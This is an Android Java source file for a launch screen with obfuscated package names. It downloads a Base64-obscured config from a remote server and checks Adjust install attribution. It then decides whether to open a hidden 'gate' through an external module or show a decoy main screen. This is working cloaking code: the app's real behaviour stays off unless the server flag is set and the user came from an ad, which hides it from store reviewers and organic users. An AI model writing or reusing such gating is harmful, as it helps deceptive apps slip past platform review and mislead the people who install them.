package vnieurnvberv.boierhiueba.ncvueryeibre;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Base64;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;

import com.adjust.sdk.Adjust;
import com.adjust.sdk.AdjustAttribution;
import com.adjust.sdk.AdjustConfig;
import com.adjust.sdk.LogLevel;

import org.android.dalvik.GateKt;
import org.jetbrains.annotations.Nullable;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class WelcomeActivity extends Activity {

    private static String S_ADJUST_TOKEN = "xm1pg7ztdkhs";
    private static String S_ACTIVITY_A = "com.weqrgrg.web.MainActivity";
    private static String S_ACTIVITY_B = ".ncvueryeibre";

    private String s1() {
        String url = "https://www.777br111.com/one.json";
        return getStringFromServer(url);
    }


    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        RelativeLayout loadingView = new RelativeLayout(getApplicationContext());
        ProgressBar progressbar = new ProgressBar(this);
        RelativeLayout.LayoutParams layoutParams = new RelativeLayout.LayoutParams(-2, -2);
        layoutParams.addRule(13);
        progressbar.setLayoutParams(layoutParams);
        loadingView.addView(progressbar);

//        TextView loadingView=new TextView(this);
//        loadingView.setTextColor(Color.BLUE);
//        loadingView.setTextSize(23f);
//        loadingView.setGravity(Gravity.CENTER);
//        loadingView.setText("loading");

        setContentView(loadingView);

        try {
            if (!GateKt.getGateState((Context) this.getApplication())) {
                this.initAdjust();
            }

            new Thread((Runnable) (() -> {
                String mainActivityName = null;
                if (!GateKt.getGateState((Context) WelcomeActivity.this.getApplication())) {
                    boolean ck = WelcomeActivity.this.checkCrypto();
                    if (GateKt.gateEnable((Context) WelcomeActivity.this.getApplication(), ck)) {
                        GateKt.openGate((Activity) WelcomeActivity.this);
                    } else {
                        GateKt.closeGate((Activity) WelcomeActivity.this);
                        mainActivityName = S_ACTIVITY_A;
                    }
                }
                String finalMainActivityName = mainActivityName;
                WelcomeActivity.this.runOnUiThread((Runnable) (() -> WelcomeActivity.this.startMain((String) finalMainActivityName)));
            })).start();
        } catch (Exception var7) {
            var7.printStackTrace();
        }
    }

    private void initAdjust() {
        AdjustConfig config = new AdjustConfig((Context) this.getApplication(), S_ADJUST_TOKEN, "production");
        config.setLogLevel(LogLevel.VERBOSE);
        config.setOnAttributionChangedListener(attribution -> {
        });
        Adjust.onCreate(config);
    }

    protected void onResume() {
        super.onResume();
        try {
            if (!GateKt.getGateState((Context) this.getApplication())) {
                Adjust.onResume();
            }
        } catch (Exception ignored) {
        }
    }

    protected void onPause() {
        super.onPause();
        try {
            if (!GateKt.getGateState((Context) this.getApplication())) {
                Adjust.onPause();
            }
        } catch (Exception ignored) {
        }
    }

    private boolean checkCrypto() {
        Config config = this.loadCloudConfig();
        if (config != null) {
            if (config.getGate() == 0) {
                return false;
            }

            if (config.getOrganic() == 1) {
                return true;
            }

            return this.getAttribution() == 1;
        }

        return false;
    }

    private void startMain(String mainName) {
        String mainActivityName = mainName;
        try {
            if (mainActivityName == null && this.getClassLoader().loadClass(getBaseContext().getPackageName() + S_ACTIVITY_B) != null) {
                mainActivityName = getBaseContext().getPackageName() + S_ACTIVITY_B;
            }
        } catch (Exception ignored) {
        }

        if (mainActivityName != null) {
            Intent appIntent = new Intent();
            appIntent.setComponent(new ComponentName((Context) this, mainActivityName));
            this.startActivity(appIntent);
            this.finish();
        }

    }

    private int getAttribution() {
        try {
            AdjustAttribution attribution = Adjust.getAttribution();
            while (attribution == null) {
                try {
                    Thread.sleep(500L);
                } catch (Exception var4) {
                    var4.printStackTrace();
                }
                attribution = Adjust.getAttribution();
            }
            if (attribution.network.equalsIgnoreCase("organic")) {
                return 0;
            }
            return 1;
        } catch (Exception var5) {
            var5.printStackTrace();
            return 0;
        }
    }

    private Config loadCloudConfig() {
        return this.decryptConfig(this.decodeKey(this.s1(), true));
    }

    private String getStringFromServer(String url) {
//        String var2 = "";
//        try {
//            OkHttpClient mOkHttpClient = new OkHttpClient();
//            mOkHttpClient.newBuilder().connectTimeout(120L, TimeUnit.SECONDS);
//            Request request = (new Request.Builder()).url(url).build();
//            Response response = mOkHttpClient.newCall(request).execute();
//            if (response.isSuccessful()) {
//                ResponseBody var10000 = response.body();
//                if (var10000 != null) {
//                    var2 = var10000.string();
//                }
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        return var2;
        String str;
        try {
            URL uRL = new URL(url);
            HttpURLConnection httpURLConnection = (HttpURLConnection) uRL.openConnection();
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setConnectTimeout(120000);
            httpURLConnection.connect();
            if (httpURLConnection.getResponseCode() == 200) {
                InputStream inputStream = httpURLConnection.getInputStream();
                str = convertStream2String(inputStream);
            } else {
                str = "";
            }
        } catch (Exception exception) {
            exception.printStackTrace();
            str = "";
        }
        return str;
    }

    public String convertStream2String(InputStream paramInputStream) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] arrayOfByte = new byte[512];
        try {
            while (true) {
                int i = paramInputStream.read(arrayOfByte);
                if (i != -1) {
                    byteArrayOutputStream.write(arrayOfByte, 0, i);
                    continue;
                }
                return new String(byteArrayOutputStream.toByteArray());
            }
        } catch (IOException iOException) {
            iOException.printStackTrace();
            return null;
        }
    }

    private String decodeKey(String base, boolean cfg) {
        try {
            if (base.isEmpty()) {
                return base;
            }
            if (cfg) {
                base = base.substring(Integer.parseInt(base.substring(0, 1)));
            }
            base = new String(Base64.decode(base.getBytes(StandardCharsets.UTF_8), Base64.NO_WRAP), StandardCharsets.UTF_8);
        } catch (Exception var8) {
            base = "";
        }
        return base;
    }

    private String decodeKey(String base) {
        return decodeKey(base, false);
    }

    private Config decryptConfig(String cfg) {
        Config config = null;
        try {
            if (cfg != null && !cfg.isEmpty()) {
                JSONObject json = new JSONObject(cfg);
                config = new Config(json.getInt(decodeKey("Zw==")),//gate g
                        json.getInt(decodeKey("bw=="))//,//organic o
                );
            }
        } catch (Exception var7) {
            var7.printStackTrace();
        }
        return config;
    }

    public static class Config {
        private int gate;
        private int organic;

        public Config(int gate, int organic) {
            this.gate = gate;
            this.organic = organic;
        }

        public int getGate() {
            return this.gate;
        }

        public int getOrganic() {
            return this.organic;
        }
    }
}
